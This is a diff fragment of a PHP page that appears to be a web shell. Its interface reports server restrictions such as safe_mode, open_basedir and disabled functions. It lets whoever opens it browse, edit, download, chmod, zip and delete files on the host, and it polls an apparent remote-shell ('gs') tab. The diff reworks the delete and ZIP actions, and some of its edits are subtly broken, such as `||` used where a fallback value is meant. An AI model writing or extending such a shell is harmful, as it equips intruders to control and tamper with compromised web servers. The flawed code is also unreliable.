-        open_basedir: <span style="color:<?php echo $open_basedir ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($open_basedir ?: 'off'); ?></span><br>
+        safe_mode: <span style="color:<?php echo $safe_mode ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($safe_mode || 'off'); ?></span> |
+        open_basedir: <span style="color:<?php echo $open_basedir ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($open_basedir || 'off'); ?></span><br>
         TimeZone: <?php echo h($timezone); ?><br>
-        Disabled: <span style="color:#ff7b72; word-wrap:break-word;"><?php echo h($disabled ?: 'none'); ?></span><br>
+        Disabled: <span style="color:<?php echo ($disabled === 'none' || $disabled === '') ? '#7ee787' : '#ff7b72'; ?>; word-wrap:break-word;"><?php echo h($disabled === '' ? 'none' : $disabled); ?></span><br>
         Path: <span class="path"><?php echo breadcrumb_path($cwd_real); ?></span>
         <a href="?"><strong>[ HOME ]</strong></a> ~|~
         <a href="?logout=1" style="color:#ff7b72;"><strong>[ Logout ]</strong></a>
@@ -1514,6 +1806,7 @@ if ($view != '' && @is_file($view)) { ?>
         <div class="name">Directory List</div>
         <div style="margin-top:10px;">
             <form method="post" id="batchForm" autocomplete="off">
+                <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                 <div id="batchActionBar" style="display:none; margin-bottom:10px; gap:8px; align-items:center; flex-wrap:wrap; background:#1b2330; padding:10px; border-radius:8px; border:1px solid #3a4f6e;">
                     <span style="font-weight:bold; color:#fff;">Batch Action:</span>
                     <input type="text" name="batch_mode" placeholder="(mis: 0755)" style="width:100px;">
@@ -1608,23 +1901,15 @@ if ($view != '' && @is_file($view)) { ?>
                                 <a class="btn btn-green" href="?edit=<?php echo urlencode($full); ?>">Edit</a>
                                 <a class="btn btn-yellow" href="?download=<?php echo urlencode($full); ?>">Download</a>
                             <?php } else { ?>
-                                <a class="btn" href="?path=<?php echo urlencode($full); ?>">Open</a>
-                                <form method="post" style="display:inline;" onsubmit="return confirm('Download folder ini sebagai ZIP?');">
-                                    <input type="hidden" name="action" value="zip_folder">
-                                    <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
-                                    <input type="hidden" name="target" value="<?php echo h($full); ?>">
-                                    <input type="submit" class="btn btn-blue" value="ZIP" style="padding:2px 6px;font-size:10px;">
-                                </form>
+                                                                <a class="btn" href="?path=<?php echo urlencode($full); ?>">Open</a>
+                                <button type="button" class="btn btn-blue" onclick="confirmZipFolder('<?php echo h(addslashes($cwd_real)); ?>', '<?php echo h(addslashes($full)); ?>')" style="padding:2px 6px;font-size:10px;">ZIP</button>
                             <?php } ?>
                             <a class="btn" href="?action_page=rename&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Rename</a>
                             <a class="btn" href="?action_page=chmod&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Chmod</a>
                             <a class="btn" href="?action_page=touch&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Touch</a>
-                            <form method="post" style="display:inline;" onsubmit="return confirm('Yakin hapus?');">
-                                <input type="hidden" name="action" value="delete">
-                                <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
-                                <input type="hidden" name="target" value="<?php echo h($full); ?>">
-                                <input type="submit" class="btn btn-red" value="Delete" style="padding:2px 6px;font-size:10px;">
-                            </form>
+                            <button type="button" class="btn btn-red"
+    onclick="if(confirm('Yakin hapus <?php echo h(addslashes($item)); ?>?')){location.href='?path=<?php echo urlencode($cwd_real); ?>&delete_path=<?php echo urlencode($full); ?>';}"
+    style="padding:2px 6px;font-size:10px;">Delete</button>
                         </td>
                     </tr>
                     <?php
@@ -1635,6 +1920,16 @@ if ($view != '' && @is_file($view)) { ?>
                     ?>
                 </table>
                 </div>
+            </form>
+            <form method="post" id="zipFolderForm" style="display:none;">
+                <input type="hidden" name="action" value="zip_folder">
+                <input type="hidden" name="path" id="zipPath" value="">
+                <input type="hidden" name="target" id="zipTarget" value="">
+            </form>
+            <form method="post" id="delForm" style="display:none;">
+                <input type="hidden" name="action" value="delete">
+                <input type="hidden" name="path" id="delPath" value="">
+                <input type="hidden" name="target" id="delTarget" value="">
             </form>
         </div>
     </div>
@@ -1728,6 +2023,18 @@ function toggleActionBar() {
     } else {
         bar.style.display = 'none';
     }
+}
+function confirmDelete(path, target) {
+    if (!confirm('Yakin hapus ' + target + '?')) return;
+    document.getElementById('delPath').value = path;
+    document.getElementById('delTarget').value = target;
+    document.getElementById('delForm').submit();
+}
+function confirmZipFolder(path, target) {
+    if (!confirm('Download folder ' + target + ' sebagai ZIP?')) return;
+    document.getElementById('zipPath').value = path;
+    document.getElementById('zipTarget').value = target;
+    document.getElementById('zipFolderForm').submit();
 }
 statPoll(); setInterval(statPoll, 1500);
 <?php if ($tab === 'gs'): ?>gsPoll(); setInterval(gsPoll, 3000);<?php endif; ?>
